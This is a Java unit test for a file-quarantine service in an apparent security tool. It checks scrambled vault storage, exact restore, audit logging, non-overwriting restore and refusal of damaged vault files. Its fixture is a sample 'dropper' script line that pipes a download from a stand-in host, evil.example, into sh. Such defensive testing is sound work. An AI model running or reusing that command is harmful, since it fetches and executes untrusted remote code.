package com.aegislens.app;

import com.aegislens.db.AuditLogRepository;
import com.aegislens.db.Database;
import com.aegislens.db.QuarantineRepository;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.*;

class QuarantineServiceTest {

    private static final String CONTENT = "#!/bin/sh\ncurl -s http://evil.example/x | sh\n";

    @TempDir
    Path dir;

    @Test
    void quarantineScramblesAndRestoreBringsTheSameBytesBack() throws Exception {
        try (Database db = Database.inMemory()) {
            QuarantineService q = service(db);
            Path file = write("dropper.sh");
            long id = q.quarantine(file, "MAL-002 dropper");
            assertFalse(Files.exists(file), "moved away");
            Path vaultFile;
            try (var files = Files.list(q.vault())) {
                vaultFile = files.findFirst().orElseThrow();
            }
            String stored = Files.readString(vaultFile, StandardCharsets.ISO_8859_1);
            assertTrue(stored.startsWith("AEGISQ1"));
            assertFalse(stored.contains("curl"), "the payload is scrambled in the vault");

            Path back = q.restore(id);
            assertEquals(file.toAbsolutePath(), back);
            assertEquals(CONTENT, Files.readString(back));
            assertFalse(Files.exists(vaultFile));
            assertTrue(new QuarantineRepository(db).find(id).orElseThrow().restored());
            assertEquals(2, new AuditLogRepository(db).recent(10).size(), "quarantine and restore are audited");
            assertThrows(IOException.class, () -> q.restore(id), "cannot restore twice");
        }
    }

    @Test
    void restoreNeverOverwritesAndRefusesADamagedVaultFile() throws Exception {
        try (Database db = Database.inMemory()) {
            QuarantineService q = service(db);
            Path file = write("a.bin");
            long first = q.quarantine(file, "test");
            Files.writeString(file, "a new file took its place");
            Path back = q.restore(first);
            assertEquals("a.bin.restored-1", back.getFileName().toString());
            assertEquals("a new file took its place", Files.readString(file));

            Path other = write("b.bin");
            long second = q.quarantine(other, "test");
            try (var files = Files.list(q.vault())) {
                Path vaultFile = files.findFirst().orElseThrow();
                byte[] bytes = Files.readAllBytes(vaultFile);
                bytes[bytes.length - 1] ^= 0x55;                   // damage one byte
                Files.write(vaultFile, bytes);
            }
            assertThrows(IOException.class, () -> q.restore(second));
            assertFalse(Files.exists(other), "nothing half-restored");
        }
    }

    private QuarantineService service(Database db) {
        return new QuarantineService(dir.resolve("vault"), new QuarantineRepository(db), new AuditLogRepository(db));
    }

    private Path write(String name) throws IOException {
        Path p = dir.resolve(name);
        Files.writeString(p, CONTENT);
        return p;
    }
}
